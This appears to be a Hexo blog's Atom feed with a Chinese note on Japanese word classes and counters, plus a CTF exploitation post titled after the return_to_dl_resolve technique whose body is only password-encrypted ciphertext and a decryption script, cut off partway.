<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WinterSun Space</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winter3un.github.io/"/>
  <updated>2019-06-14T01:42:52.653Z</updated>
  <id>https://winter3un.github.io/</id>
  
  <author>
    <name>WinterSun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日语词性</title>
    <link href="https://winter3un.github.io/2019/06/13/cixing/"/>
    <id>https://winter3un.github.io/2019/06/13/cixing/</id>
    <published>2019-06-14T01:35:26.000Z</published>
    <updated>2019-06-14T01:42:52.653Z</updated>
    
    <content type="html"><![CDATA[<p><code>2019年6月14日 09:33:19</code>更新</p><a id="more"></a><h2 id="体言"><a href="#体言" class="headerlink" title="体言"></a>体言</h2><h3 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h3><h3 id="代词"><a href="#代词" class="headerlink" title="代词"></a>代词</h3><p>「こそあど」所衍生的指示代词</p><h3 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a>数量词</h3><p><strong>比较本土化及书面化的用法：</strong></p><p>一つ（ひとつ）<br>二つ（ふたつ）<br>三つ（みっつ）<br>四つ（よっつ）<br>五つ（いつつ）<br>六つ（むっつ）<br>七つ（ななつ）<br>八つ（やっつ）<br>九つ（ここのつ）<br>十（とお）</p><p><strong>口语上的用法：</strong></p><p>1个（いっこ）<br>2个（にこ）<br>三个（さんこ）<br>四个（よんこ）<br>五个（ごこ）<br>六个（ろっこ）<br>七个（ななこ）<br>八个（はっこ）<br>九个（きゅうこ）<br>十个（じゅっこ）</p><h2 id="用言"><a href="#用言" class="headerlink" title="用言"></a>用言</h2><h3 id="形容词"><a href="#形容词" class="headerlink" title="形容词"></a>形容词</h3><p>也被叫作一类形容词，原型情况下，通常是词尾是い。</p><h3 id="形容动词"><a href="#形容动词" class="headerlink" title="形容动词"></a>形容动词</h3><p>也被叫作二类形容词，原型情况下，通常没有词尾，在简体形式下要加だ。</p><p>特殊的二类形容词：嫌い</p><h3 id="动词"><a href="#动词" class="headerlink" title="动词"></a>动词</h3><h4 id="一类动词"><a href="#一类动词" class="headerlink" title="一类动词"></a>一类动词</h4><p>以う段假名结尾，并且不是二类及三类动词的，分到一类动词</p><h4 id="二类动词"><a href="#二类动词" class="headerlink" title="二类动词"></a>二类动词</h4><p>以る结尾，并且倒数第二个假名为え段假名。</p><h4 id="三类动词"><a href="#三类动词" class="headerlink" title="三类动词"></a>三类动词</h4><p>1、か变动词</p><p>来る（くる）、变化比较特殊</p><p>2、さ变动词</p><p>する、以及与する结合而成的复合动词（比如：勉强する、旅行する）</p><img src="/2019/06/13/cixing/1.png" alt="1.png" title="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;2019年6月14日 09:33:19&lt;/code&gt;更新&lt;/p&gt;
    
    </summary>
    
    
      <category term="日语" scheme="https://winter3un.github.io/tags/%E6%97%A5%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>通过return_to_dl_resolve技术秒题</title>
    <link href="https://winter3un.github.io/2018/08/19/return-to-dl-resolve/"/>
    <id>https://winter3un.github.io/2018/08/19/return-to-dl-resolve/</id>
    <published>2018-08-20T03:47:22.000Z</published>
    <updated>2018-08-20T03:52:54.348Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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